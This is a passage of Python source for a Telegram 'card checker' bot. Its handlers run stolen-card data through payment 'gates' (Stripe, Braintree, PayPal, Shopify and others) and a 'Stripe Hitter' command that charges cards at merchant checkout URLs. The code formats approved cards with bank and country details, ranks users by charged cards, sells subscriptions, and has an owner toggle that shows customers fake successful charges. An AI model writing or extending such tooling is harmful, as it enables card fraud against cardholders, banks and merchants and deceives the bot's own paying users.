            _gif_pending.discard(query)
    threading.Thread(target=_w, daemon=True).start()

def get_sexy_anime_gif(category):
    """Non-blocking GIF fetcher. Always returns instantly:
       - cached result if available, else
       - any cached fallback from another category, else
       - None (caller can skip the GIF)
       Cache is refreshed asynchronously in the background.
    """
    queries = _GIF_QUERIES.get(category, _GIF_QUERIES["welcome"])
    query = random.choice(queries)

    if query in _gif_cache and _gif_cache[query]:
        return random.choice(_gif_cache[query])

    # Schedule background refresh — does NOT block the event loop
    _refresh_gif_cache_bg(query)

    # Try any other cached query in the same category
    for q in queries:
        if q in _gif_cache and _gif_cache[q]:
            return random.choice(_gif_cache[q])

    # Try any cached query at all (cross-category fallback)
    for q_list in _GIF_QUERIES.values():
        for q in q_list:
            if q in _gif_cache and _gif_cache[q]:
                return random.choice(_gif_cache[q])

    # Cold cache — return None; caller falls back to text-only message
    return None

def _preload_gif_cache():
    """Warm the cache at startup so the first user never waits."""
    import threading
    def _w():
        for q_list in _GIF_QUERIES.values():
            for q in q_list:
                if q not in _gif_cache:
                    try:
                        gifs = search_tenor_gif(q, 8)
                        if gifs:
                            with _gif_cache_lock:
                                _gif_cache[q] = gifs
                    except Exception:
                        pass
        print(f"🎬 GIF cache preloaded — {len(_gif_cache)} queries cached")
    threading.Thread(target=_w, daemon=True).start()

async def send_approved_card_with_gif(update: Update, card: str, gate: str, response: str, check_time: float, bin_info: dict = None):
    """Send approved card notification with anime GIF (Onichan branding)"""
    try:
        gif_url = get_sexy_anime_gif("success")

        parts = card.split('|')
        if len(parts) >= 4:
            cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        else:
            cc = card
            mm = yy = cvv = "?"

        if not bin_info:
            from modules.gate_checker import get_bin_info
            bin_info = get_bin_info(cc)

        gate_names = {
            'st': 'Stripe Auth', 'ss': 'Stripe Auth $0.5', 'bu': 'Braintree Auth',
            'pp': 'PayPal $1', 'ppv': 'PayPal V2', 'sor': 'Stripe $2',
            'st5': 'Stripe $5', 'st12': 'Stripe $12', 'str': 'Stripe $15',
            'dep': 'Stripe $49', 'b3': 'Braintree $3', 'b3n': 'Braintree $5',
            'rz': 'Razorpay ₹10', 'stm': 'Stripe Mass Auth', 'se1': 'Stripe €1',
            'sh': 'Shopify', 'sh6': 'Shopify $6', 'sh8': 'Shopify $8',
            'sh10': 'Shopify $10', 'sh13': 'Shopify $13', 'bt1': 'Braintree $1',
            'bt3d': 'Braintree 3D', 'sq': 'Square Auth', 'auz': 'Authorize $0',
            'st1': 'Stripe $1', 'ast': 'Auto Stripe',
        }
        gate_display = gate_names.get(gate, gate.upper())

        brand = bin_info.get('brand', 'Unknown') if bin_info else 'Unknown'
        card_type = bin_info.get('type', '') if bin_info else ''
        level = bin_info.get('level', '') if bin_info else ''
        network_line = brand
        if card_type and card_type.upper() != 'UNKNOWN':
            network_line += f" • {card_type}"
        if level and level.upper() != 'UNKNOWN':
            network_line += f" • {level}"

        bank = bin_info.get('bank', 'Unknown') if bin_info else 'Unknown'
        country = bin_info.get('country', 'Unknown') if bin_info else 'Unknown'
        bin_code = bin_info.get('bin', cc[:6]) if bin_info else cc[:6]
        yy_display = yy if len(yy) == 4 else f"20{yy}"

        sep = "━━━━━━━━━━━━━━━━━━━━"

        msg = f"""💜 <b>ONICHAN • {gate_display.upper()}</b>
{sep}
💳 <code>{cc}|{mm}|{yy}|{cvv}</code>
{sep}
📈 <b>Status</b>   : Approved ✅
💬 <b>Response</b> : {response[:60] if response else 'Charged'}
{sep}
🔢 <b>BIN</b>      : {bin_code}
💠 <b>Network</b>  : {network_line}
🏦 <b>Bank</b>     : {bank}
🌍 <b>Country</b>  : {country}
{sep}
⏱ <b>Time</b>     : {check_time:.2f}s
⚡ <b>Powered</b>  : @{SUPPORT_USERNAME}"""

        msg = ae(msg)

        await update.message.reply_animation(
            animation=gif_url,
            caption=msg,
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        print(f"Error sending approved card GIF: {e}")
        await update.message.reply_text(
            f"✅ <b>APPROVED</b>\n<code>{card}</code>\n{response}",
            parse_mode=ParseMode.HTML
        )

async def send_hit_to_user_pm(bot, user_id: int, card_data: dict, checkout_data: dict, result: dict, check_time: float):
    """Send successful hit to user's private chat — SEMEX-style with anime GIF."""
    try:
        from modules.bin_lookup import lookup_bin

        cc = card_data.get('cc', '')
        mm = card_data.get('month', '')
        yy = card_data.get('year', '')
        cvv = card_data.get('cvv', '')
        full_card = f"{cc}|{mm}|{yy}|{cvv}"
        bin6 = cc[:6]

        bin_info = lookup_bin(bin6) if cc else {}
        bank     = (bin_info.get('bank')    or 'BANK').upper()
        brand    = (bin_info.get('brand')   or 'UNKNOWN').upper()
        card_type = (bin_info.get('type') or bin_info.get('card_type') or 'CREDIT').upper()
        category = (bin_info.get('level') or bin_info.get('category') or 'UNKNOWN').upper()
        country  = (bin_info.get('country') or 'UNKNOWN').upper()
        flag     = bin_info.get('country_emoji', '🌍')

        merchant = html.escape(str(checkout_data.get('merchant', 'Unknown')))
        price    = checkout_data.get('price', 0)
        currency = (checkout_data.get('currency') or 'USD').upper()
        sym      = get_currency_symbol(currency)
        price_str = f"{sym}{float(price):.2f}" if price else "N/A"

        response_text = html.escape(str(result.get('response', 'Payment Successful'))[:80])
        status = result.get('status', 'CHARGED')
        status_line = "CHARGED ✅" if status == "CHARGED" else "LIVE 🟡"

        charge_str = f"Charged {currency} {float(price):.1f}" if price else response_text

        success_url = checkout_data.get('success_url') or ''
        success_line = ""
        if success_url and success_url != 'N/A':
            su = html.escape(success_url)
            su_short = su[:55] + "..." if len(su) > 55 else su
            success_line = f"\n🎯 <b>Success URL</b> → <a href='{su}'>{su_short}</a>"

        hit_msg = ae(
            f"[ STRIPE HITTER — /hit ]\n\n"
            f"💳 <b>CC</b> → <code>{html.escape(full_card)}</code>\n"
            f"🔴 <b>Status</b> → {status_line}\n"
            f"🔒 <b>Response</b> → {charge_str}\n"
            f"💰 <b>BIN</b> → {bin6} — {brand} — {card_type}\n"
            f"👑 <b>Category</b> → {category}\n"
            f"🏦 <b>Bank</b> → {bank}\n"
            f"🌍 <b>Country</b> → {flag} {country}\n"
            f"🏪 <b>Merchant</b> → {merchant} — {price_str}\n"
            f"⏱ <b>Time</b> → {check_time:.2f}s"
            f"{success_line}\n\n"
            f"⚡ <b>Bot</b> → @{SUPPORT_USERNAME}"
        )

        gif_url = get_sexy_anime_gif("success")
        await bot.send_animation(
            chat_id=user_id,
            animation=gif_url,
            caption=hit_msg,
            parse_mode=ParseMode.HTML
        )
        return True
    except Exception as e:
        print(f"Error sending hit to user PM: {e}")
        try:
            await bot.send_message(
                chat_id=user_id,
                text=(
                    f"✅ <b>HIT!</b>\n\n"
                    f"💳 <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
                    f"💰 CHARGED {sym}{float(price) if price else 0:.2f} {currency}"
                ),
                parse_mode=ParseMode.HTML
            )
        except:
            pass
        return False


# ─── Show-Site mode per user ──────────────────────────────────────────────────
_SHOW_SITE_FILE = None

def _get_show_site_file():
    global _SHOW_SITE_FILE
    if _SHOW_SITE_FILE is None:
        try:
            from config import DATABASE_DIR
            import os as _os
            _SHOW_SITE_FILE = _os.path.join(DATABASE_DIR, "show_site_modes.json")
        except:
            _SHOW_SITE_FILE = "/tmp/show_site_modes.json"
    return _SHOW_SITE_FILE

def get_user_show_site(user_id: int) -> str:
    """Returns 'always' or 'ask'. Default is 'always'."""
    try:
        import json as _j, os as _os
        f = _get_show_site_file()
        if _os.path.exists(f):
            with open(f, 'r') as fp:
                return _j.load(fp).get(str(user_id), "always")
    except:
        pass
    return "always"

def set_user_show_site(user_id: int, mode: str):
    try:
        import json as _j, os as _os
        f = _get_show_site_file()
        _os.makedirs(_os.path.dirname(f), exist_ok=True)
        data = {}
        if _os.path.exists(f):
            with open(f, 'r') as fp:
                data = _j.load(fp)
        data[str(user_id)] = mode
        with open(f, 'w') as fp:
            _j.dump(data, fp)
    except:
        pass


# ─── Hit-detail block builder ─────────────────────────────────────────────────
def _build_hit_detail_block(card, result, checkout_data, bin_info, check_time):
    """Build a SEMEX-style detailed hit block for one charged/live card."""
    cc  = card.get('cc', '')
    mm  = card.get('month', '')
    yy  = card.get('year', '')
    cvv = card.get('cvv', '')
    full_card = f"{cc}|{mm}|{yy}|{cvv}"

    brand     = (bin_info.get('brand')    or 'UNKNOWN').upper()
    card_type = (bin_info.get('type') or bin_info.get('card_type') or 'CREDIT').upper()
    bank      = (bin_info.get('bank')     or 'BANK').upper()
    country   = (bin_info.get('country')  or 'UNKNOWN').upper()
    flag      = bin_info.get('country_emoji', '🌍')
    category  = (bin_info.get('level') or bin_info.get('category') or 'UNKNOWN').upper()
    bin6      = cc[:6]

    status     = result.get('status', 'CHARGED')
    status_line = "CHARGED ✅" if status == "CHARGED" else "LIVE 🟡"
    price      = checkout_data.get('price', 0)
    currency   = (checkout_data.get('currency') or 'USD').upper()
    charge_str = f"Charged {currency} {float(price):.1f}" if price else html.escape(str(result.get('response', ''))[:60])

    success_url = checkout_data.get('success_url') or ''
    success_line = ""
    if success_url and success_url != 'N/A':
        su = html.escape(success_url)
        su_short = su[:50] + "..." if len(su) > 50 else su
        success_line = f"\n🎯 <b>Success URL</b> → <a href='{su}'>{su_short}</a>"

    return (
        f"💳 <b>CC</b> → <code>{html.escape(full_card)}</code>\n"
        f"🔴 <b>Status</b> → {status_line}\n"
        f"🔒 <b>Response</b> → {charge_str}\n"
        f"💰 <b>BIN</b> → {bin6} — {brand} — {card_type}\n"
        f"👑 <b>Category</b> → {category}\n"
        f"🏦 <b>Bank</b> → {bank}\n"
        f"🌍 <b>Country</b> → {flag} {country}\n"
        f"⏱ <b>Time</b> → {check_time:.2f}s"
        f"{success_line}"
    )


# ─── Dashboard helpers ────────────────────────────────────────────────────────
def _build_hit_dashboard(user, stats, rank, premium_info_line):
    """Return (text, InlineKeyboardMarkup) for the /hit main dashboard."""
    total   = stats.get('total',   0)
    approved = stats.get('approved', 0)
    uname   = f"@{user.username}" if user.username else str(user.id)

    text = ae(
        f"[ 🔥 STRIPE HITTER — /hit ]\n\n"
        f"👋 <b>Welcome, {html.escape(user.first_name)}!</b>\n"
        f"┌ User 〝 {html.escape(uname)}\n"
        f"└ ID 〝 <code>{user.id}</code>\n\n"
        f"📋 <b>Plan Status</b>\n"
        f"├ {rank}\n"
        f"└ {html.escape(premium_info_line)}\n\n"
        f"✅ <b>All-Time Stats</b>\n"
        f"├ Total Checked 〝 {total:,}\n"
        f"└ Charged 〝 {approved:,}\n\n"
        f"<i>Use /hit &lt;url&gt; &lt;card|mm|yy|cvv&gt; to start hitting</i>"
    )

    keyboard = InlineKeyboardMarkup([
        [
            _btn("⚡ Hit Cards",  style="danger",  callback_data="hit_hitcards"),
            _btn("🎰 Generator",  style="danger",  callback_data="hit_generator"),
        ],
        [
            _btn("✅ My Hits",    style="success", callback_data="hit_myhits"),
            _btn("📊 My Status", style="success", callback_data="hit_status"),
        ],
        [
            _btn("👑 Ranking",    style="primary", callback_data="hit_ranking"),
            _btn("💾 Saved BINs", style="primary", callback_data="hit_savedbins"),
        ],
        [
            _btn("📋 Plans",      style="default", callback_data="hit_plans"),
            _btn("⚙️ Settings",  style="default", callback_data="hit_settings"),
        ],
        [_btn("🔗 Support", style="primary", url=f"https://t.me/{SUPPORT_USERNAME}")],
    ])
    return text, keyboard


def _get_user_recent_hits(user_id, limit=5):
    """Return last N hitter-charged card lines from the approved log."""
    from modules.approved_cards_logger import get_user_approved_cards
    all_cards = get_user_approved_cards(user_id, limit=500)
    hits = []
    for line in reversed(all_cards):
        parts = line.split('|')
        if len(parts) >= 5:
            gate = parts[4].strip()
            if 'hitter' in gate or gate.startswith('auto_hit'):
                hits.append(parts)
        if len(hits) >= limit:
            break
    return hits


def _get_hit_leaderboard(limit=10):
    """Top users by hitter-charged count from approved cards log."""
    from modules.approved_cards_logger import get_approved_cards
    user_data: dict = {}
    for line in get_approved_cards(limit=20000):
        parts = line.split('|')
        if len(parts) >= 5:
            uid   = parts[1].strip()
            uname = parts[2].strip().lstrip('@')
            gate  = parts[4].strip()
            if 'hitter' in gate or gate.startswith('auto_hit'):
                if uid not in user_data:
                    user_data[uid] = {'username': uname, 'count': 0}
                user_data[uid]['count'] += 1
    return sorted(user_data.items(), key=lambda x: x[1]['count'], reverse=True)[:limit]

# ============================================================================
# ACCESS CONTROL DECORATOR
# ============================================================================

def require_approval(func):
    """Decorator to require user approval"""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        
        # Check if banned
        if is_banned(user.id):
            gif_url = get_sexy_anime_gif("banned")
            ban_caption = ae("🚫 <b>YOU ARE BANNED!</b>\n\nYou cannot use this bot.")
            if gif_url:
                await update.message.reply_animation(
                    animation=gif_url, caption=ban_caption, parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(ban_caption, parse_mode=ParseMode.HTML)
            return
        
        # Check if approved
        if not is_approved(user.id):
            # Add to pending
            add_to_pending(user.id, user.username, user.first_name)
            
            # Notify owner
            if OWNER_ID > 0:
                try:
                    await context.bot.send_message(
                        chat_id=OWNER_ID,
                        text=f"🔔 <b>New User Request</b>\n\n"
                             f"👤 Name: {user.first_name}\n"
                             f"🆔 ID: <code>{user.id}</code>\n"
                             f"👤 Username: @{user.username or 'None'}\n\n"
                             f"Use /approve {user.id} to approve",
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
            
            await update.message.reply_text(
                "⏳ <b>Access Pending</b>\n\n"
                "Your request has been sent to the owner.\n"
                "Please wait for approval.\n\n"
                f"Contact: @{SUPPORT_USERNAME}",
                parse_mode=ParseMode.HTML
            )
            return
        
        return await func(update, context)
    return wrapper

def get_premium_denied_message(user_id):
    """Get the appropriate premium denied message based on status"""
    status = check_premium_status(user_id)
    if status == "expired":
        return ("⚠️ <b>PREMIUM EXPIRED!</b>\n\n"
                "Your premium subscription has expired.\n"
                "Renew now to continue using premium features.\n\n"
                "💎 Use /premium to renew your subscription.")
    else:
        return ("💎 <b>PREMIUM REQUIRED!</b>\n\n"
                "This feature requires premium access.\n\n"
                f"💎 Use /premium to get premium access.\n"
                f"📞 Contact: @{SUPPORT_USERNAME}")

def require_premium(func):
    """Decorator to require premium access"""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        
        if not is_premium(user.id):
            gif_url = get_sexy_anime_gif("premium")
            msg = get_premium_denied_message(user.id)
            if gif_url:
                await update.message.reply_animation(
                    animation=gif_url, caption=msg, parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
            return
        
        return await func(update, context)
    return wrapper


# ============================================================================
# START COMMAND
# ============================================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command - No approval required for start"""
    from modules.database import get_user_check_stats
    user = update.effective_user
    
    # Check if banned
    if is_banned(user.id):
        gif_url = get_sexy_anime_gif("banned")
        ban_caption = ae("🚫 <b>YOU ARE BANNED!</b>\n\nYou cannot use this bot.")
        if gif_url:
            await update.message.reply_animation(
                animation=gif_url, caption=ban_caption, parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(ban_caption, parse_mode=ParseMode.HTML)
        return
    
    rank = get_user_rank(user.id)
    
    # Get user stats
    stats = get_user_check_stats(user.id)
    total_checks = stats.get('total', 0)
    approved = stats.get('approved', 0)
    declined = stats.get('declined', 0)
    success_rate = stats.get('success_rate', 0)
    first_check = stats.get('first_check')
    
    # Format join date
    if first_check:
        join_date = first_check.strftime("%b %d, %Y")
    else:
        join_date = "New User"
    
    sep = "━━━━━━━━━━━━━━━━━━━━"
    text = ae(f"""💜 <b>ONICHAN CHECKER</b>
{sep}
🌸 <b>Hii {user.first_name}!</b>
{sep}
👑 <b>Status</b>   : {rank}
🆔 <b>ID</b>       : <code>{user.id}</code>
📅 <b>Since</b>    : {join_date}
💳 <b>Checks</b>   : {total_checks:,}
✅ <b>Approved</b> : {approved:,}
❌ <b>Declined</b> : {declined:,}
📈 <b>Rate</b>     : {success_rate}%
{sep}
⚡ 21 Gates | 📋 Mass Check | 🎯 Auto Hitter
🔮 Proxy | 📱 Temp Phone | 🧚 AI Chat
{sep}
💎 <b>Premium</b> : $3/w · $5/2w · $10/m · $25/3m
{sep}""")
    
    reply_markup = _build_start_keyboard(0, is_owner(user.id))
    
    # Send welcome message WITH GIF
    try:
        welcome_gif = get_sexy_anime_gif("welcome")
        if welcome_gif:
            await update.message.reply_animation(
                animation=welcome_gif, caption=text,
                parse_mode=ParseMode.HTML, reply_markup=reply_markup)
        else:
            await update.message.reply_text(
                text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
    except Exception as e:
        logger.warning(f"Start command fallback triggered: {e}")
        try:
            await update.message.reply_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
        except:
            await update.message.reply_text("Welcome! Send /help for commands")

async def cb_magic(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cycle through magic themes on the /start keyboard."""
    query = update.callback_query
    try:
        theme_idx = int(query.data.split(":")[1])
    except Exception:
        theme_idx = 0
    toast = _MAGIC_TOASTS[theme_idx % len(_MAGIC_TOASTS)]
    await query.answer(toast)
    owner = is_owner(query.from_user.id)
    new_markup = _build_start_keyboard(theme_idx, owner)
    try:
        await query.edit_message_reply_markup(reply_markup=new_markup)
    except Exception:
        pass


# ============================================================================
# ADMIN PANEL (OWNER ONLY)
# ============================================================================

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin panel - Owner only"""
    query = update.callback_query
    user = query.from_user
    
    if not is_owner(user.id):
        await query.answer(ae("❌ Owner only!"), show_alert=True)
        return
    
    await query.answer()
    
    # Get stats
    try:
        with open(DB_OWNER, 'r') as f:
            owners_count = len([l for l in f if l.strip()])
        with open(DB_PREMIUM, 'r') as f:
            premium_count = len([l for l in f if l.strip()])
        with open(DB_FREE, 'r') as f:
            free_count = len([l for l in f if l.strip()])
        with open(DB_BANNED, 'r') as f:
            banned_count = len([l for l in f if l.strip()])
        with open(DB_PENDING, 'r') as f:
            pending_count = len([l for l in f if l.strip()])
    except:
        owners_count = premium_count = free_count = banned_count = pending_count = 0
    
    sep = "━━━━━━━━━━━━━━━━━━━━"
    text = ae(f"""💜 <b>ONICHAN • ADMIN</b>
{sep}
👑 <b>Owners</b>   : {owners_count}
💎 <b>Premium</b>  : {premium_count}
🆓 <b>Free</b>     : {free_count}
⏳ <b>Pending</b>  : {pending_count}
🚫 <b>Banned</b>   : {banned_count}
{sep}
/approve · /premium · /ban · /unban
/broadcast · /stats · /pending
{sep}
🤖 @{BOT_USERNAME} | 👑 @{OWNER_USERNAME}""")
    
    keyboard = [
        [_btn("All Users", style="primary", icon=EID["users"], callback_data="admin_users")],
        [
            _btn("Premium", style="success", icon=EID["crown"], callback_data="admin_premium"),
            _btn("Free", style="success", icon=EID["free"], callback_data="admin_free")
        ],
        [
            _btn("Pending", style="primary", icon=EID["hitting"], callback_data="admin_pending"),
            _btn("Banned", style="danger", icon=EID["blocked"], callback_data="admin_banned")
        ],
        [_btn("Admins", style="primary", icon=EID["crown"], callback_data="admin_admins")],
        [_btn("Statistics", style="success", icon=EID["stats"], callback_data="admin_stats")],
        [_btn("Settings", style="primary", icon=EID["lock"], callback_data="admin_settings")],
        [_btn("BACK", style="default", icon=EID["back"], callback_data="start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    gif_url = get_sexy_anime_gif("admin")
    chat_id = query.message.chat_id
    try:
        await query.message.delete()
    except Exception:
        pass
    if gif_url:
        try:
            await context.bot.send_animation(
                chat_id=chat_id, animation=gif_url, caption=text,
                parse_mode=ParseMode.HTML, reply_markup=reply_markup)
            return
        except Exception:
            pass
    await context.bot.send_message(
        chat_id=chat_id, text=text,
        parse_mode=ParseMode.HTML, reply_markup=reply_markup)

# ============================================================================
# ADMIN COMMANDS
# ============================================================================

async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Approve a user - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "✅ <b>Approve User</b>\n\n"
            "<b>Usage:</b> <code>/approve &lt;user_id&gt;</code>\n\n"
            "<b>Example:</b> <code>/approve 123456789</code>\n\n"
            "Grants the user access to use the bot.\n"
            "👑 Owner only.",
            parse_mode=ParseMode.HTML,
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Add to free users
        with open(DB_FREE, 'a') as f:
            f.write(f"{target_id}\n")
        invalidate_user_cache(target_id)  # flush permission cache

        # Remove from pending
        try:
            with open(DB_PENDING, 'r') as f:
                lines = f.readlines()
            with open(DB_PENDING, 'w') as f:
                for line in lines:
                    if not line.startswith(str(target_id)):
                        f.write(line)
        except:
            pass
        
        await update.message.reply_text(ae(f"✅ User {target_id} approved!"))
        
        # Notify user
        try:
            await context.bot.send_message(
                chat_id=target_id,
                text=ae("✅ <b>Access Approved!</b>\n\nYou can now use the bot.\nSend /start to begin!"),
                parse_mode=ParseMode.HTML
            )
        except:
            pass
            
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def rspfakeon(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enable fake auto hitter success mode - Owner only"""
    global FAKE_AUTOHITTER_MODE
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    FAKE_AUTOHITTER_MODE = True
    await update.message.reply_text(
        "✅ <b>Fake Auto Hitter Mode: ON</b>\n\n"
        "All /co commands will now show fake successful payment responses.\n"
        "Use /rspfakeoff to disable.",
        parse_mode=ParseMode.HTML
    )

async def rspfakeoff(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Disable fake auto hitter success mode - Owner only"""
    global FAKE_AUTOHITTER_MODE
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    FAKE_AUTOHITTER_MODE = False
    await update.message.reply_text(
        "❌ <b>Fake Auto Hitter Mode: OFF</b>\n\n"
        "All /co commands will now show real responses.",
        parse_mode=ParseMode.HTML
    )

async def give_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Give premium access with invoice - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "⭐ <b>Give Premium</b>\n\n"
            "<b>Usage:</b> <code>/premium &lt;user_id&gt; &lt;plan&gt;</code>\n\n"
            "<b>Arguments:</b>\n"
            "• <code>user_id</code> — Telegram ID of the user\n"
            "• <code>plan</code> — One of: 1_week, 2_weeks, 1_month, 3_months\n\n"
            "<b>Example:</b>\n"
            "<code>/premium 123456789 1_month</code>\n\n"
            "👑 Owner only."
        )
        return
    
    try:
        target_id = int(context.args[0])
        plan_key = context.args[1]
        
        # Get plan info
        plan = get_plan_info(plan_key)
        if not plan:
            await update.message.reply_text(ae("❌ Invalid plan! Use: 1_week, 2_weeks, 1_month, 3_months"))
            return
        
        # Get target user info
        try:
            target_user = await context.bot.get_chat(target_id)
            target_username = target_user.username or target_user.first_name
        except:
            target_username = "User"
        
        # Generate invoice
        invoice_data = generate_invoice(target_id, target_username, plan_key, "Manual Payment")
        
        if not invoice_data:
            await update.message.reply_text(ae("❌ Error generating invoice!"))
            return
        
        # Add to premium - update PostgreSQL first
        from datetime import datetime, timedelta
        from modules.database import set_premium_sync, add_user_sync
        
        expiry = datetime.now() + timedelta(days=plan['duration_days'])
        expiry_str = expiry.strftime("%Y-%m-%d")
        
        # Ensure user exists and set premium in PostgreSQL
        add_user_sync(target_id, target_username, "approved")
        set_premium_sync(target_id, plan['duration_days'])
        invalidate_user_cache(target_id)  # flush permission cache immediately

        # Also write to local file as backup
        try:
            with open(DB_PREMIUM, 'a') as f:
                f.write(f"{target_id} {expiry_str}\n")
        except:
            pass
        
        # Send invoice to owner
        await update.message.reply_text(
            f"✅ <b>Premium Activated!</b>\n\n"
            f"User: {target_id}\n"
            f"Plan: {plan['name']}\n"
            f"Price: ${plan['price']}\n"
            f"Expires: {expiry_str}",
            parse_mode=ParseMode.HTML
        )
        
        # Send invoice to user
        try:
            await context.bot.send_message(
                chat_id=target_id,
                text=invoice_data['invoice'],
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True
            )
        except:
            pass
            
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def remove_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove premium from a user - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "⭐ <b>Remove Premium</b>\n\n"
            "<b>Usage:</b> <code>/rmpremium &lt;user_id&gt;</code>\n\n"
            "<b>Example:</b> <code>/rmpremium 123456789</code>\n\n"
            "Revokes premium access from the user immediately.\n"
            "👑 Owner only.",
            parse_mode=ParseMode.HTML,
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        from modules.database import remove_premium_sync
        
        result = remove_premium_sync(target_id)
        invalidate_user_cache(target_id)  # flush permission cache

        if result:
            await update.message.reply_text(
                f"✅ <b>Premium Removed!</b>\n\n"
                f"User: <code>{target_id}</code>\n"
                f"Status: Free user now",
                parse_mode=ParseMode.HTML
            )
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=ae("⚠️ <b>Premium Revoked</b>\n\n"
                         "Your premium subscription has been removed by the admin.\n"
                         "You no longer have access to premium features.\n\n"
                         "💎 Use /premium to renew your subscription."),
                    parse_mode=ParseMode.HTML
                )
            except Exception as notify_err:
                print(f"[Premium] Could not notify user {target_id}: {notify_err}")
        else:
            await update.message.reply_text(ae(f"❌ Failed to remove premium for user {target_id}"))
            
    except ValueError:
        await update.message.reply_text(ae("❌ Invalid user ID!"))
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check user subscription status"""
    user = update.effective_user
    
    if context.args and is_owner(user.id):
        try:
            target_id = int(context.args[0])
        except ValueError:
            await update.message.reply_text(ae("❌ Invalid user ID!"))
            return
    else:
        target_id = user.id
    
    try:
        from modules.database import get_connection, is_db_connected
        from psycopg2.extras import RealDictCursor
        
        if not is_db_connected():
            await update.message.reply_text(ae("❌ Database not connected!"))
            return
        
        conn = get_connection()
        with conn.cursor(cursor_factory=RealDictCursor) as cur:
            cur.execute("""
                SELECT user_id, username, status, premium, premium_expiry, is_owner, created_at
                FROM users WHERE user_id = %s
            """, (target_id,))
            result = cur.fetchone()
        
        if not result:
            if target_id == 8119946836:
                await update.message.reply_text(
                    f"👤 <b>User Info</b>\n\n"
                    f"🆔 ID: <code>{target_id}</code>\n"
                    f"👑 Status: <b>Owner</b>\n"
                    f"💎 Premium: <b>Lifetime</b>\n"
                    f"📅 Expires: <b>Never</b>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(ae(f"❌ User {target_id} not found in database!"))
            return
        
        status_emoji = "👑" if result.get("is_owner") else ("✅" if result.get("status") == "approved" else "⏳")
        premium_status = "Lifetime" if result.get("is_owner") else ("Active" if result.get("premium") else "None")
        
        expiry_text = "Never"
        if result.get("premium_expiry") and not result.get("is_owner"):
            expiry = result["premium_expiry"]
            if hasattr(expiry, 'strftime'):
                expiry_text = expiry.strftime("%Y-%m-%d %H:%M")
            else:
                expiry_text = str(expiry)[:16]
        
        role = "Owner" if result.get("is_owner") else ("Premium" if result.get("premium") else "Free")
        
        await update.message.reply_text(
            f"👤 <b>User Info</b>\n\n"
            f"🆔 ID: <code>{result['user_id']}</code>\n"
            f"📛 Username: @{result.get('username') or 'N/A'}\n"
            f"{status_emoji} Status: <b>{result.get('status', 'pending').title()}</b>\n"
            f"💎 Premium: <b>{premium_status}</b>\n"
            f"📅 Expires: <b>{expiry_text}</b>\n"
            f"🎭 Role: <b>{role}</b>",
            parse_mode=ParseMode.HTML
        )
        
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def show_plans(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show premium plans"""
    plans = get_all_plans()
    
    sep = "━━━━━━━━━━━━━━━━━━━━"
    text = ae(f"""💜 <b>ONICHAN • PLANS</b>
{sep}
""")
    
    for plan_key, plan in plans.items():
        text += f"📦 <b>{plan['name']}</b> — {plan['currency']}{plan['price']} ({plan['duration_days']}d)\n"
    
    text += f"""{sep}
💳 Crypto · PayPal · Bank Transfer
📞 @tu_bkl_hai | 📢 @krishnaslounge"""
    
    keyboard = [
        [_btn("Contact Owner", icon=EID["users"], url="https://t.me/tu_bkl_hai")],
        [_btn("Join Channel", icon=EID["broadcast"], url="https://t.me/krishnaslounge")],
        [_btn("BACK", style="default", icon=EID["back"], callback_data="start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)

# ============================================================================
# CRYPTO PAYMENT COMMANDS
# ============================================================================

def get_payment_settings():
    """Get payment settings from settings file"""
    from config import DB_SETTINGS
    settings = {
        'payment_mode': 'crypto',
        'manual_payment_info': 'Contact @tu_bkl_hai for manual payment',
        'manual_payment_address': '',
        'manual_payment_instructions': ''
    }
    try:
        with open(DB_SETTINGS, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if '=' in line:
                    key, value = line.split('=', 1)
                    settings[key.strip()] = value.strip()
    except:
        pass
    return settings


STARS_PLANS = {
